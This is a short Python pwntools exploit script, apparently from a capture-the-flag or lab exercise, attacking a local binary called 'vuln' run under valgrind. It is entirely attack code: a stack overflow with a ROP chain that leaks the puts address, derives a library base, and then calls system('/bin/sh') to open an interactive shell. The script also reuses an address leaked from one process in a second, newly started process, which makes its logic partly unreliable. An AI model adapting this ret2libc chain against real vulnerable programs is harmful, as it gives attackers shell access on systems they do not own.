from pwn import *



padding = b"a" * 136
local = ELF("vuln")
libc = ELF("/usr/lib/x86_64-linux-gnu/valgrind/vgpreload_memcheck-amd64-linux.so")



# find libc base address
puts_plt = local.plt["puts"]
puts_got = local.got["puts"]

log.info("puts plt: %s", hex(puts_plt))
log.info("puts got: %s", hex(puts_got))

r = process(["valgrind", "-q", "./vuln"])
rop_bl = ROP(local)
pop_rdi_g = (rop_bl.find_gadget(["pop rdi", "ret"]))[0]
log.info("pop rdi: %s", hex(pop_rdi_g))

rop_bl.raw(padding)
rop_bl.raw(p64(pop_rdi_g))
rop_bl.raw(p64(puts_got))
rop_bl.raw(p64(puts_plt))

log.info("payload: %s", rop_bl.dump())

r.sendline(rop_bl.chain())


puts_addr_leaked = u64(r.recvlines(3)[2].ljust(8, b"\x00"))
log.info("leaked puts address: %s", hex(puts_addr_leaked))
libc.address = puts_addr_leaked - libc.symbols["puts"]

r.close()



# execute /bin/sh
system_addr = libc.sym["system"]
sh_addr = next(libc.search(b"/bin/sh"))
exit_addr = libc.sym["exit"]

log.info("libc base address: %s", hex(libc.address))
log.info("address of system: %s", hex(system_addr))
log.info("address of /bin/sh: %s", hex(sh_addr))

rop = ROP(local)

pop_rdi_g = (rop.find_gadget(["pop rdi", "ret"]))[0]


rop.raw(padding)
rop.raw(p64(pop_rdi_g))
rop.raw(p64(sh_addr))
rop.raw(p64(system_addr))
rop.raw(p64(exit_addr))

log.info("payload: %s", rop.dump())

p = process(["valgrind", "-q", "./vuln"])
p.sendline(rop.chain())
p.interactive()
